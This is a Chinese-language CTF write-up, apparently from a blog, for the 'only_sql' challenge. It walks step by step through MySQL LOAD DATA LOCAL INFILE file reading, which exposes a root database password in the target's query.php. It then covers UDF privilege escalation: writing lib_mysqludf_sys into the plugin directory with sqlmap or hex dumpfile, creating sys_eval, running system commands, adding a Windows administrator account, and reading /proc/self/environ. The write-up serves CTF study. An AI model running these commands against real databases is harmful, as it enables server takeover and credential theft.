href="#环境测试" class="headerlink" title="环境测试:"></a>环境测试:</h2><p><img src="/images/2024-2-3-only_sql/image-20240202144824585.png" alt="image-20240202144824585"></p><h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句:"></a>sql语句:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">INSERT INTO test (text_field) VALUES (&#x27;flag&#123;666&#125;&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202145356151.png" alt="image-20240202145356151"></p><p><img src="/images/2024-2-3-only_sql/image-20240202145106390.png" alt="image-20240202145106390"></p><p><img src="/images/2024-2-3-only_sql/image-20240202145130651.png" alt="image-20240202145130651"></p><p>成功进行执行！！！</p><p>环境的基本运行逻辑就是这样，但是由于一些本地权限的配置，所以一些业务操作的数据库语句无法通过网络直接进行执行，所以我们只能在本地的mysql服务端中进行测试。</p><h2 id="远程读客户端文件："><a href="#远程读客户端文件：" class="headerlink" title="远程读客户端文件："></a>远程读客户端文件：</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/query.php&quot; into table test<br></code></pre></td></tr></table></figure><p>使用题目环境成功连接我们的数据库服务端之后，我们可以使用load data,数据库操作语句读取题目网页的文件信息，即可以利用该操作，读取题目的query.php文件，该文件存在于&#x2F;var&#x2F;www&#x2F;html&#x2F;文件夹下。</p><h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试:"></a>本地测试:</h3><p>创建一个文件在我们的apache服务端下:<br>flag.txt:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;you_are_win!!!&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202151238614.png" alt="image-20240202151238614"></p><p>现在使用mysql的文件下载操作，读取我们的flag.txt:</p><h3 id="文件数据下载"><a href="#文件数据下载" class="headerlink" title="文件数据下载:"></a>文件数据下载:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/flag.txt&quot; into table test<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202151636383.png" alt="image-20240202151636383"></p><p>成功将flag.txt文件下载到我们的test表的text_field字段中！！！</p><p>所以我们可以使用题目的mysql服务端下载题目网页中的文件：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/query.php&quot; into table test;<br></code></pre></td></tr></table></figure><h3 id="query-php"><a href="#query-php" class="headerlink" title="query.php:"></a>query.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// mine</span><br><span class="hljs-comment">// $db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="hljs-comment">// $db_username = &#x27;root&#x27;;</span><br><span class="hljs-comment">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><br><span class="hljs-comment">// $db_name = &#x27;mysql&#x27;;</span><br><span class="hljs-variable">$$db_host</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_host&quot;</span>];<br><span class="hljs-variable">$$db_username</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_username&quot;</span>];<br><span class="hljs-variable">$$db_password</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_password&quot;</span>];<br><span class="hljs-variable">$$db_name</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_name&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<br><span class="hljs-variable">$db_host</span>))&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        $<br>dsn = <span class="hljs-string">&quot;mysql:host=</span><br><span class="hljs-string"><span class="hljs-subst">$db_host</span>;dbname=$</span><br><span class="hljs-string">db_name&quot;</span>;<br>        <br><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>($<br>dsn, <br><span class="hljs-variable">$db_username</span>, $<br>db_password);<br>        <br><span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br>        $<br>_SESSION[<span class="hljs-string">&#x27;dsn&#x27;</span>]=<br><span class="hljs-variable">$dsn</span>;<br>        $<br>_SESSION[<span class="hljs-string">&#x27;db_username&#x27;</span>]=<br><span class="hljs-variable">$db_username</span>;<br>        $<br>_SESSION[<span class="hljs-string">&#x27;db_password&#x27;</span>]=<br><span class="hljs-variable">$db_password</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> $<br>e) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;dsn&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;请先连接数据库);window.location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过代码审计我们得到了出题人提供的数据库信息:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">// $db_host = &#x27;127.0.0.1&#x27;;<br>// $db_username = &#x27;root&#x27;;<br>// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;<br>// $db_name = &#x27;mysql&#x27;;<br></code></pre></td></tr></table></figure><p>所以我们可以使用该数据库信息去连接，从而去获取出题人的网页中的数据库信息以及文件信息。</p><h2 id="plugin-udf-提权"><a href="#plugin-udf-提权" class="headerlink" title="plugin udf 提权"></a>plugin udf 提权</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提:"></a>利用前提:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &lt; 5.0，导出路径随意<br>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)<br>mysql &gt;= 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限<br></code></pre></td></tr></table></figure><h3 id="使用udf提权的一些操作"><a href="#使用udf提权的一些操作" class="headerlink" title="使用udf提权的一些操作:"></a>使用udf提权的一些操作:</h3><h4 id="查看靶机的mysql版本信息"><a href="#查看靶机的mysql版本信息" class="headerlink" title="查看靶机的mysql版本信息"></a>查看靶机的mysql版本信息</h4><p>(这里用本地的mysql代替)：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>SELECT VERSION();<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202154824045.png" alt="image-20240202154824045"></p><p>数据库版本为10.11.5,因为MySQL &gt;&#x3D; 5.1已经是环境最苛刻的了,所以无法再进行本地测试了。</p><h4 id="查询可写目录"><a href="#查询可写目录" class="headerlink" title="查询可写目录:"></a>查询可写目录:</h4><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下表示可以向任意绝对路径写文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>show global variables like &#x27;%secure_file_priv%&#x27;;<br></code></pre></td></tr></table></figure><h4 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录:"></a>寻找插件目录:</h4><p>mysql数据库版本 &gt;&#x3D; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数，接下来去找dll文件</p><h5 id="使用如下的-SQL-语句来查询MySQL的插件目录"><a href="#使用如下的-SQL-语句来查询MySQL的插件目录" class="headerlink" title="使用如下的 SQL 语句来查询MySQL的插件目录:"></a>使用如下的 SQL 语句来查询MySQL的插件目录:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/eb29293c33a6361d45a077a2b983079b.png" alt="img"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹<br><br>有一个问题需要注意：利用phpstudy安装的mysql，默认是不存在 \lib\plugin 这个文件夹的，如果目标安装的是完整版mysql数据库，是存在的，如果没有这个文件夹后边的操作就无法继续了<br></code></pre></td></tr></table></figure><h4 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹:"></a>创建文件夹:</h4><p>网上有个说法，利用<strong>NTFS ADS</strong>流模式突破进而创建文件夹</p><h5 id="使用语句查找MySQL安装目录"><a href="#使用语句查找MySQL安装目录" class="headerlink" title="使用语句查找MySQL安装目录:"></a>使用语句查找MySQL安装目录:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>select @@basedir;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202161019150.png" alt="image-20240202161019150"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;    //利用NTFS ADS创建lib目录<br><br>select &#x27;It is dll&#x27; into dumpfile &#x27;mysql安装目录\\lib::$INDEX_ALLOCATION&#x27;;<br><br> <br>select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;;    //利用NTFS ADS创建plugin目录<br><br>select &#x27;It is dll&#x27; into dumpfile &#x27;mysql安装目录\\lib\\plugin::$INDEX_ALLOCATION&#x27;;<br></code></pre></td></tr></table></figure><p>如果真的没有<code>\lib\plugin</code>还是可以尝试，但是不一定成功。</p><h4 id="写入动态链接库文件："><a href="#写入动态链接库文件：" class="headerlink" title="写入动态链接库文件："></a>写入动态链接库文件：</h4><h5 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况:"></a>第一种情况:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.如果拿到了网站的webshell，可以直接通过webshell管理工具比如蚁剑等，直接找到目录上传dll文件<br></code></pre></td></tr></table></figure><h5 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况:"></a>第二种情况:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">2.存在 SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制（HTTP本身并未对请求长度施加任何硬编码的限制，但浏览器的限制范围为2kb-8kb）所以往往 POST 注入才可以执行这种攻击<br></code></pre></td></tr></table></figure><h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlmap -u &quot;http://localhost:30008/&quot; --data=&quot;id=1&quot; --file-write=&quot;usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&quot; --file-dest=&quot;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&quot;<br></code></pre></td></tr></table></figure><h5 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况:"></a>第三种情况:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">如果没有注入的话，但是通过爆破密码、phpmyadmin漏洞以及通过webshell等手段，可以执行sql语句，也是可以可以操作原生 SQL 语句手工写文件到 plugin 目录下的<br></code></pre></td></tr></table></figure><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br># 直接 SELECT 查询十六进制写入<br>SELECT 0xcode INTO DUMPFILE &#x27;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&#x27;;<br><br># 解码十六进制再写入多此一举<br>SELECT unhex(&#x27;0xcode&#x27;) INTO DUMPFILE &#x27;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>关于十六进制可以直接这这个页面查询到对应的编码：<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><p>一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;)) into dumpfile &#x27;/tmp/udf.txt&#x27;; <br><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile &#x27;/tmp/udf.txt&#x27;;<br><br>0x2f6c69625f6d7973716c7564665f7379735f36342e736f<br>=&gt;<br>/lib_mysqludf_sys_64.so<br></code></pre></td></tr></table></figure><p>将lib_mysqludf_sys_64.so文件中的内容进行16进制加密之后存入&#x2F;tmp&#x2F;udf.txt文件中</p><h4 id="上传库文件到被攻击的数据库plugin目录下，文件名可以任意取"><a href="#上传库文件到被攻击的数据库plugin目录下，文件名可以任意取" class="headerlink" title="上传库文件到被攻击的数据库plugin目录下，文件名可以任意取:"></a>上传库文件到被攻击的数据库plugin目录下，文件名可以任意取:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">select unhex(&#x27;7F454C46020...&#x27;) into dumpfile &#x27;/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so&#x27;;<br><br>假设/tmp/udf.txt文件中的16进制内容为xxx,则就是将xxx16进制解码后放入plugin目录下的mysqludf.so，如果plugin文件夹下不存在mysqludf.so文件，则会自动生成<br>select unhex(&#x27;xxx&#x27;) into dumpfile &#x27;/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so&#x27;;<br></code></pre></td></tr></table></figure><h4 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令:"></a>创建自定义函数并调用命令:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>select * from mysql.func;<br></code></pre></td></tr></table></figure><p>正确的回显:</p><p><img src="/images/2024-2-3-only_sql/image-20240202164845159.png" alt="image-20240202164845159"></p><p>如果不成功的话,是因为dll版本不符。</p><h4 id="通过创建的这个函数来执行系统命令了："><a href="#通过创建的这个函数来执行系统命令了：" class="headerlink" title="通过创建的这个函数来执行系统命令了："></a>通过创建的这个函数来执行系统命令了：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>select sys_eval(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure><p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">SELECT sys_eval(<br>&#x27;net user ocean1 ocean1 /add &amp; net localgroup administrators ocean1 /add&#x27;<br>)<br></code></pre></td></tr></table></figure><h3 id="上传udf库文件"><a href="#上传udf库文件" class="headerlink" title="上传udf库文件:"></a>上传udf库文件:</h3><h4 id="获取plugin路径"><a href="#获取plugin路径" class="headerlink" title="获取plugin路径:"></a>获取plugin路径:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>show variables like &quot;%plugin%&quot;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202173358044.png" alt="image-20240202173358044"></p><h4 id="获取服务器版本信息"><a href="#获取服务器版本信息" class="headerlink" title="获取服务器版本信息:"></a>获取服务器版本信息:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>show variables like &#x27;version_compile_%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202181215556.png" alt="image-20240202181215556"></p><h4 id="准备udf库文件-动态链接库文件"><a href="#准备udf库文件-动态链接库文件" class="headerlink" title="准备udf库文件(动态链接库文件):"></a>准备udf库文件(动态链接库文件):</h4><p>常用的工具 <a href="https://so.csdn.net/so/search?q=sqlmap&spm=1001.2101.3001.7020">sqlmap</a> 和 Metasploit 里面都自带了对应系统的动态链接库文件，可以直接找</p><h5 id="sqlmap-的-UDF-动态链接库文件位置"><a href="#sqlmap-的-UDF-动态链接库文件位置" class="headerlink" title="sqlmap 的 UDF 动态链接库文件位置:"></a>sqlmap 的 UDF 动态链接库文件位置:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlmap中有现成的udf文件。分别是32位和64位的。这里选择<br>sqlmap根目录/data/udf/mysql<br>sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_。<br><br># kali的sqlmap在/usr/share/sqlmap目录<br></code></pre></td></tr></table></figure><p>有32位和64位之分，这个dll并不是跟系统位数有关的，而是跟mysql版本有关系</p><p><strong>要注意的是Sqlmap中自带的动态链接库文件为了防止被误杀都经过编码处理过，不能被直接使用，需要使用 sqlmap 自带的解码工具cloak.py 来解码使用:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 脚本位置<br>/usr/share/sqlmap/extra/cloak/<br># 执行<br>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_<br># 进行dll_文件的解码，获得dll文件<br></code></pre></td></tr></table></figure><p>此时会在相同目录生成解密后的lib_mysqludf_sys.so。</p><h4 id="Metasploit-的-UDF-动态链接库文件位置"><a href="#Metasploit-的-UDF-动态链接库文件位置" class="headerlink" title="Metasploit 的 UDF 动态链接库文件位置:"></a>Metasploit 的 UDF 动态链接库文件位置:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">usr/share/metasploit-framework/data/exploits/mysql<br># kali自带的msf<br><br>在kali的/usr/share/metasploit-framework/data/exploits/mysql目录下找到相应的库即可。<br><br>这个库和sqlmap解密后的一模一样。<br></code></pre></td></tr></table></figure><h4 id="获取库文件的16进制"><a href="#获取库文件的16进制" class="headerlink" title="获取库文件的16进制:"></a>获取库文件的16进制:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select hex(load_file(&#x27;/security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;)) into outfile &#x27;/tmp/udf.txt&#x27;;<br></code></pre></td></tr></table></figure><h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数:"></a>创建函数:</h4><p>先在<strong>本地</strong>查看有哪些函数可用:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">nm -D lib_mysqludf_sys.so<br></code></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">                 w _Jv_RegisterClasses<br>0000000000201788 A __bss_start<br>                 w __cxa_finalize<br>                 w __gmon_start__<br>0000000000201788 A _edata<br>0000000000201798 A _end<br>0000000000001178 T _fini<br>0000000000000ba0 T _init<br>                 U fgets<br>                 U fork<br>                 U free<br>                 U getenv<br>000000000000101a T lib_mysqludf_sys_info<br>0000000000000da4 T lib_mysqludf_sys_info_deinit<br>0000000000001047 T lib_mysqludf_sys_info_init<br>                 U malloc<br>                 U mmap<br>                 U pclose<br>                 U popen<br>                 U realloc<br>                 U setenv<br>                 U strcpy<br>                 U strncpy<br>0000000000000dac T sys_bineval<br>0000000000000dab T sys_bineval_deinit<br>0000000000000da8 T sys_bineval_init<br>0000000000000e46 T sys_eval<br>0000000000000da7 T sys_eval_deinit<br>0000000000000f2e T sys_eval_init<br>0000000000001066 T sys_exec<br>0000000000000da6 T sys_exec_deinit<br>0000000000000f57 T sys_exec_init<br>00000000000010f7 T sys_get<br>0000000000000da5 T sys_get_deinit<br>0000000000000fea T sys_get_init<br>000000000000107a T sys_set<br>00000000000010e8 T sys_set_deinit<br>0000000000000f80 T sys_set_init<br>                 U sysconf<br>                 U system<br>                 U waitpid<br></code></pre></td></tr></table></figure><h4 id="创建sys-eval函数"><a href="#创建sys-eval函数" class="headerlink" title="创建sys_eval函数:"></a>创建<code>sys_eval</code>函数:</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">create function sys_eval returns string soname &quot;mysqludf.so&quot;;<br></code></pre></td></tr></table></figure><h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数:"></a>删除自定义函数:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>drop function sys_eval;<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">常规SQLMAP的--OS-SHELL流程大致为：利用SELECT … INTO OUTFILE … LINES TERMINATED BY上传小马（仅上传功能） -&gt; 利用小马上传Webshell（可使用system、proc_open、shell_exec、passthru、popen、exec执行命令） -&gt; 利用Webshell执行命令（明文参数cmd=whoami）<br>现在大多数Mysql版本都大于5.1，版本大于5.1后对于提权的条件很苛刻，所以大多数情况下都没办法使用udf进行一个提权<br></code></pre></td></tr></table></figure><h2 id="only-sql题目复现"><a href="#only-sql题目复现" class="headerlink" title="only_sql题目复现:"></a>only_sql题目复现:</h2><h3 id="第一步：使用如下的-SQL-语句来查询MySQL的插件目录"><a href="#第一步：使用如下的-SQL-语句来查询MySQL的插件目录" class="headerlink" title="第一步：使用如下的 SQL 语句来查询MySQL的插件目录:"></a>第一步：使用如下的 SQL 语句来查询MySQL的插件目录:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt;<br>show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><h4 id="plugin-目录被改了"><a href="#plugin-目录被改了" class="headerlink" title="plugin 目录被改了:"></a>plugin 目录被改了:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/var/lib/mysql/p1ugin<br></code></pre></td></tr></table></figure><h3 id="第二步：写入动态链接库文件："><a href="#第二步：写入动态链接库文件：" class="headerlink" title="第二步：写入动态链接库文件："></a>第二步：写入动态链接库文件：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select unhex(&#x27;xxx&#x27;) into dumpfile &#x27;/usr/lib/mysql/p1ugin/hacker.so&#x27;;<br>//xxx为上述中/tmp/udf.txt文件夹下的16进制加密内容，这里取名上传的配置文件为hacker.so<br></code></pre></td></tr></table></figure><h3 id="第三步：创建一个可以进行命令执行的函数"><a href="#第三步：创建一个可以进行命令执行的函数" class="headerlink" title="第三步：创建一个可以进行命令执行的函数:"></a>第三步：创建一个可以进行命令执行的函数:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">//使用上传的hacker.so创建一个命令执行函数<br>create function sys_eval returns string soname &#x27;hacker.so&#x27;;<br></code></pre></td></tr></table></figure><h3 id="第四步：RCE："><a href="#第四步：RCE：" class="headerlink" title="第四步：RCE："></a>第四步：RCE：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt;<br>select sys_eval(&#x27;cat /proc/self/environ&#x27;;)<br></code></pre></td></tr></table></figure><p>获取flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>软件工程第二组(Demo)初成果演示</title>
